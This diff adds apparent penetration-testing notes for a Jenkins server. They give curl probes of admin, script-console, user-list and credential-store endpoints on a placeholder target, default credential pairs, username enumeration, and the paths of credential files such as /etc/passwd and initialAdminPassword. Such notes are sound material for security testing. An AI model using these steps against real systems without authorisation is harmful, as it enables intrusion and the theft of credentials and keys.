@@ -1,0 +1,46 @@
+Step 1: Check if Jenkins is accessible
+    curl -v http://<target-ip>:8080/
+
+Step 2: Check for Anonymous Access
+    - curl -v http://<target-ip>:8080/manage
+    - If you can access it without logging in, Jenkins might be misconfigured and exploitable.
+    - If it asks for a login, we’ll try other methods.
+
+Step 3: Try Default Credentials & Common Usernames
+    admin:admin
+    admin:password
+    admin:jenkins
+    admin:<blank password>
+    admin:123456
+
+    If these don’t work, check if the username field gives hints 
+    (e.g., "Invalid username or password" vs. "Invalid password" — 
+    this can reveal valid users).
+
+Step 4: Check for Unauthenticated Access to Specific URLs
+    1. Check for user list (may reveal usernames):
+        curl -s http://<target-ip>:8080/asynchPeople/ | grep -i "href"
+    2. Check for script console (rare, but worth trying):
+        curl -s http://<target-ip>:8080/script
+    3. Check for exposed configuration files:
+        curl -s http://<target-ip>:8080/config.xml
+        curl -s http://<target-ip>:8080/credentials/store/system/domain/_/
+    4. Check if Jenkins version is exposed (for exploits):
+        curl -s http://<target-ip>:8080/api/json
+
+Step 5: If you can read files on a system , try to read 
+            /etc/passwd - Know the home directory of jenekins user 
+        And then read users registererd on the jenekins in -
+            <JENKINS_HOME>/users/users.xml
+            The JENKINS_HOME will be usually /var/jenkins_home/
+
+Step 6: This file is also interesting if you have file read access
+    /var/jenkins_home/secrets/initialAdminPassword
+
+POST LOGIN
+Step 1: Navigate to /script endpoint to check if you have console
+Step 2: Go to /manage endpoint and check credentials . Sometimes private Keys
+        are stored there . The key will be hidden . So go check in page source
+
+
+
